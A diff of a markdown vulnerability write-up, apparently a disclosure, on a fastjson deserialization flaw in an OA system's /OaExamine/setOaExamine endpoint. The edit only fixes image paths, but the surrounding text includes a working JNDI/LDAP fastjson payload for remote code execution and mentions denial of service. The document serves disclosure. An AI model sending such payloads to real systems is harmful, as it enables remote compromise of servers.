@@ -10,13 +10,13 @@ Path：/OaExamine/setOaExamine
 
 Directly deserializing the request body may lead to a fastjson deserialization vulnerability:
 
-![image-20250826143725274](images\image-20250826143725274.png)
+![image-20250826143725274](images/image-20250826143725274.png)
 
-![image-20250826143717496](images\image-20250826143717496.png)
+![image-20250826143717496](images/image-20250826143717496.png)
 
 By default, a deserialization denial of service attack is possible:
 
-![image-20250826143809607](images\image-20250826143809607.png)
+![image-20250826143809607](images/image-20250826143809607.png)
 
 With specific dependencies and autoTypeSupport enabled, deserialization can be used to achieve RCE：
 
@@ -24,7 +24,8 @@ With specific dependencies and autoTypeSupport enabled, deserialization can be u
 {"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploit","Object":"a"}
 ```
 
-![image-20250826153102932](images\image-20250826153102932.png)
+![image-20250826153102932](images/image-20250826153102932.png)
 
 
-![image-20250826153128766](images\image-20250826153128766.png)
+![image-20250826153128766](images/image-20250826153128766.png)
+
